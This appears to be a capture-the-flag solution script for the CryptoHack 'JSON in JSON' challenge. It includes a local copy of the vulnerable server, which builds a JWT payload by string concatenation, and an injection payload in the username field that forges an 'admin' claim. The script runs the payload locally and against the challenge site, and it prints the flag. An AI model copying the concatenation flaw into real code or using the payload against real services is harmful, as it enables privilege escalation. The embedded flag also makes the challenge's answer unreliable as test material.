from Crypto.Util.number import bytes_to_long, long_to_bytes
import requests
import json
import jwt # note this is the PyJWT module, not python-jwt


FLAG = "crypto{flag}"
SECRET_KEY = "verysecretkey"

def authorise(token):
    try:
        decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    except Exception as e:
        return {"error": str(e)}

    if "admin" in decoded and decoded["admin"] == "True":
        return {"response": f"Welcome admin, here is your flag: {FLAG}"}
    elif "username" in decoded:
        return {"response": f"Welcome {decoded['username']}"}
    else:
        return {"error": "There is something wrong with your session, goodbye"}


def create_session(username):
    body = '{' \
              + '"admin": "' + "False" \
              + '", "username": "' + str(username) \
              + '"}'
    encoded = jwt.encode(json.loads(body), SECRET_KEY, algorithm='HS256')
    return {"session": encoded}

def create_session_request(username):
    return requests.get(f"https://web.cryptohack.org/json-in-json/create_session/{username}/").json()

def authorise_request(token):
    return requests.get(f"https://web.cryptohack.org/json-in-json/authorise/{token}/").json()


def challenge(interface_session, interface_authorise):
    username = '''toto", "admin":"True'''

    token = interface_session(username)["session"]

    res = interface_authorise(token)["response"].split("flag: ")[1]
    return res

if __name__ == "__main__":
    interface_session = create_session
    interface_authorise = authorise

    flag = challenge(interface_session, interface_authorise)
    assert flag == FLAG

    interface_session = create_session_request
    interface_authorise = authorise_request

    flag = challenge(interface_session, interface_authorise)
    assert flag =="crypto{https://owasp.org/www-community/Injection_Theory}"
    print(flag)




